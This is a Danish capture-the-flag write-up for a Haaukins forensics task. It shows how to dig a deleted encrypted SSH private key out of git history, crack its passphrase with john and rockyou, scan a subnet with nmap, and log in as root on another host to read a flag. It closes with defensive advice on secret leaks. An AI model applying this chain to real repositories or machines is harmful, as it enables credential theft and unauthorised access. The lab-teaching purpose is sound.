IaC privatekey (in history)

Hent en 'slettet' nøgle ud af git-historikken og knæk den.

ForensicsHaaukins CTF
🎓 Prøv selv først. Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.
📚 Baggrund: denne opgave bygger på en fælles teknik — læs primeren: Kom i gang: VPN, Hosts og lab-opsætning.

SSH ind og læs historikken

sshpass -p haaukins ssh haaukins@securevpn.hkn   # bruger/password givet i opgaveteksten
cd ~/infrastructure && git log --oneline --all

Det er et Terraform-repo (DigitalOcean-droplets + Cloudflare DNS). Commit-beskederne fortæller selv historien, ingen grund til at gætte:

# "Just realized that API should not be added to files in version control"
# "Privatekeys shouldn't be in version controls as well"
# "...this key is more secure [but] can easily be broken using john the ripper with the rockyou wordlist"

Den sidste besked er et gratis wordlist-hint, før vi overhovedet har set nøglen.

Hent de 'slettede' nøgler ud af historikken

En fil fjernet i en senere commit er stadig et git-objekt. Gennemsøg ALLE blobs for private nøgler, ikke kun den nuværende tilstand:

git rev-list --all --objects | awk '{print $1}' | while read o; do \
  [ "$(git cat-file -t $o)" = blob ] && git cat-file -p $o 2>/dev/null | grep -q 'PRIVATE KEY' && echo $o; done

To blobs: én ukrypteret OpenSSH-nøgle (i wg-1.tfs historik) og én krypteret RSA-nøgle, AES-256-CBC (i wg-2.tfs historik) — det er DEN commit-beskeden om rockyou pegede på, og det er den opgavetitlens "protected" refererer til.

git cat-file -p <wg2-blob> | sed -n '/BEGIN RSA/,/END RSA/p' > wg2_enc.key
ssh2john wg2_enc.key > wg2.john && john --wordlist=rockyou.txt wg2.john   # -> sexygirl1
ssh-keygen -p -P sexygirl1 -N '' -f wg2_dec.key

Nøglen hører ikke til DENNE maskine

Prøver man den dekrypterede nøgle direkte mod securevpn.hkn, bliver den afvist. Nøglen er til en AF DE TO DROPLETS Terraform-koden selv opretter (wg-1/wg-2) — maskiner der er på samme VPN-undernet, men ikke i DNS. Scan undernettet for at finde dem:

nmap -Pn -p22 --open 34.25.151.0/24 -oG -      # -> .100 (wg-1) og .110 (wg-2)
ssh -i wg2_dec.key -o PubkeyAcceptedKeyTypes=+ssh-rsa root@34.25.151.110 'cat /root/flag.txt'

Nyere OpenSSH afviser ssh-rsa som standard, deraf PubkeyAcceptedKeyTypes.

Decoy: den ukrypterede wg-1-nøgle giver OGSÅ root på .100, med sit eget flag.txt, men det er det FORKERTE flag. Titlen "protected privatekey" er det reelle vejskilt: det er den krypterede (wg-2) nøgle opgaven spørger om.

Hvad du har lært

  • git rev-list --all --objects + git cat-file henter 'slettede' hemmeligheder frem.
  • Passphrase-beskyttede nøgler: ssh2john + john; nyere OpenSSH kræver +ssh-rsa.
  • En fundet SSH-nøgle autoriserer ikke nødvendigvis den maskine du allerede er på, tjek om IaC-koden selv opretter ANDRE hosts (her: scan undernettet).
  • Læs titlen for at vælge den rigtige nøgle (decoy-fælde).

Hvor ses dette igen?

At "slette" en hemmelighed fra en fil og committe fjernder den ikke, den gamle version lever videre som et git-objekt i historikken. Det er en af de hyppigste rigtige secret-læk: API-nøgler, passwords og private nøgler der blev fjernet i en senere commit, men stadig kan hentes frem. Værktøjer som trufflehog og gitleaks scanner netop hele git-historikken for den slags. Når du får adgang til et repo, så gennemsøg historikken, ikke kun den nuværende tilstand, og læs commit-beskederne, de peger tit på hvad der skete.
